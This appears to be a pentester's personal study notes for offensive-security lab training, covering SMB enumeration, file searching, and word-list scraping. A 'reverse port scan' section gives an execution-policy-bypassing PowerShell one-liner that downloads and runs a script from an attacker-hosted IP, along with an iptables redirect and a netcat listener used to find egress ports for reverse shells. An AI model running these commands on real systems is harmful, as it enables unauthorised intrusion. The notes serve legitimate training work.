 Get-ChildItem  -recurse |
>>    Where-Object CreationTime -gt ([DateTime]::Parse('2019/07/19')) | Sort-Object CreationTime |
>>     Format-Table fullname|   

Get-ChildItem  -recurse |
>>    Where-Object CreationTime -gt ([DateTime]::Parse('2019/07/19')) | Select-String -pattern "administrator

## kali-docker
enum "script" für ftp
check https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt

## todo other
https://help.offensive-security.com/hc/en-us/articles/360050473812-PEN-200-Labs-Learning-Path
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4

# windows stuff

- https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#smbmap
- nmblookup -A "$rhost"
- sharpup
- powerup

# wordlist

## check tool

- html2dic

## python implementation?

```python
import scrapy

class BlogSpider(scrapy.Spider):
    name = 'blogspider'
    start_urls = ['https://www.zyte.com/blog/']

    def parse(self, response):
        for title in response.css('.oxy-post-title'):
            yield {'title': title.css('::text').get()}

        for next_page in response.css('a.next'):
            yield response.follow(next_page, self.parse)
```


```python
import requests
import collections
from bs4 import BeautifulSoup
import operator

thesite = requests.get("http://www.lemonde.fr").text

soup = BeautifulSoup(thesite, 'html.parser')
thewords = soup.get_text().split()

# keep only words over 3 chars

thewords = {w: f for  w, f in collections.Counter(thewords).items() if len(w) > 3}
topwords = sorted(thewords.items(), key=operator.itemgetter(1), reverse=True)

print(topwords)
```

```
# list open ports
# TCP
Get-NetTCPConnection -State Listen| select LocalAddress,LocalPort,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
# UDP
Get-NetUDPEndpoint | select LocalAddress,LocalPort,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} 
```

# reverse port scan (show open ports)
```
Get this script and make it downloadable on port 80:

wget https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/raw/master/port-scan-tcp.ps1
python -m http.server 80

Setup iptables just like for meterpreter/reverse_tcp_allports, but make sure port 80 is queryable, and start the netcat catch-all:

sudo iptables -i tun0 -A PREROUTING -t nat -p tcp --dport 20:79 -j REDIRECT --to-port 8000
sudo iptables -i tun0 -A PREROUTING -t nat -p tcp --dport 81:6000-j REDIRECT --to-port 8000
nc -nlvp 8000

Run the script locally:

powershell -ep bypass -nOp -c "iex (iwr http://192.168.119.248/port-scan-tcp.ps1 -UseBasicParsing);port-scan-tcp 192.168.119.248 (21,22,23,53,80,139,389,443,445,636,1433,3128,8080,3389,5985);"

If you have an output in powershell, you can see which ports the target can reach you on, and then open your set of ports (delivery, reverse shell, smb servers, etc). If you don’t have an output (blind command) you still can see on what ports you received packets by using wireshark or tcpdump. Remember that packets will be routed using PREROUTING, so netcat will not be able to see the original destination port.

Reverse tcp port scan in bash on Linux:

export ip=<IP>; for port in $(seq 20 6000); do nc -zv -w1 $ip $port& done
```
